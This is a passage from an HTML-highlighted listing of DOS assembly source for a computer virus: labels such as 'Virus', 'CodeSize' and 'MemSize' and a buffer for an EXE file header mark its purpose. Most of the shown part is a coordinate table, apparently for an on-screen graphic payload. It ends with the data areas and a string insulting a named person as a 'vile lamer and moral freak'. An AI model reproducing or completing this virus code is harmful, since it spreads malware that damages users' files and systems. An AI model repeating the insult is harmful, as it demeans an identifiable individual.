        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">176</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">010</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;В 1</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">182</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">010</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;В 1</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">170</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">015</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;В 2</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">186</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">015</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;В 2</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">170</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">020</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;В 3</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">176</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">020</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;В 3</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">182</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">020</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;В 3</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">170</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">025</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;В 4</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">186</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">025</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;В 4</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">170</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">030</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;В 5</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">176</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">030</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;В 5</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">182</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">030</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;В 5</span><span class="sc0">

        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">200</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">020</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;- 3</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">206</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">020</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;- 3</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">212</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">020</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;- 3</span><span class="sc0">

        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">103</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">055</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;- 6</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">109</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">055</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;- 6</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">115</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">055</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;- 6</span><span class="sc0">

        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">130</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">045</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;П 6</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">136</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">045</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;П 6</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">142</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">045</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;П 6</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">148</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">045</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;П 6</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">130</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">050</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;П 7</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">148</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">050</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;П 7</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">130</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">055</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;П 8</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">148</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">055</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;П 8</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">130</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">060</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;П 9</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">148</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">060</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;П 9</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">130</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">065</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;П 10</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">148</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">065</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;П 10</span><span class="sc0">

        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">161</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">045</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;И 6</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">179</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">045</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;И 6</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">161</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">050</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;И 7</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">173</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">050</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;И 7</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">179</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">050</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;И 7</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">161</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">055</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;И 8</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">170</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">055</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;И 8</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">179</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">055</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;И 8</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">161</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">060</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;И 9</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">167</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">060</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;И 9</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">179</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">060</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;И 9</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">161</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">065</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;И 10</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">179</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">065</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;И 10</span><span class="sc0">

        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">197</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">045</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;Д 6</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">203</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">045</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;Д 6</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">209</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">045</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;Д 6</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">197</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">050</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;Д 7</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">209</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">050</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;Д 7</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">197</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">055</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;Д 8</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">209</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">055</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;Д 8</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">191</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">060</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;Д 9</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">197</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">060</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;Д 9</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">203</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">060</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;Д 9</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">209</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">060</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;Д 9</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">215</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">060</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;Д 9</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">191</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">065</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;Д 10</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">215</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">065</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;Д 10</span><span class="sc0">

        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">231</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">045</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;О 6</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">237</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">045</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;О 6</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">226</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">050</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;О 7</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">242</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">050</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;О 7</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">226</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">055</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;О 8</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">242</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">055</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;О 8</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">226</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">060</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;О 9</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">242</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">060</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;О 9</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">231</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">065</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;О 10</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">237</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">065</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;О 10</span><span class="sc0">

        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">254</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">045</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;Р 6</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">045</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;Р 6</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">266</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">045</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;Р 6</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">254</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">050</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;Р 7</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">270</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">050</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;Р 7</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">254</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">055</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;Р 8</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">055</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;Р 8</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">266</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">055</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;Р 8</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">254</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">060</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;Р 9</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">254</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">065</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;Р 10</span><span class="sc0">

</span><span class="sc5">CordSize</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Cord</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">













</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">
</span><span class="sc1">;               ДАННЫЕ</span><span class="sc0">
</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'[Игорь Влад. Власов - подлый ламер и моральный урод]'</span><span class="sc0">

</span><span class="sc5">CodeSize</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Virus</span><span class="sc0">

</span><span class="sc5">Temp</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Header</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">18h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">Buffer</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">CodeSize</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">Key4</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">MemSize</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Virus</span><span class="sc0">

</span><span class="sc5">Code</span><span class="sc0">        </span><span class="sc9">ends</span><span class="sc0">
        </span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">Virus</span><span class="sc0">
</span></div></body>
</html>
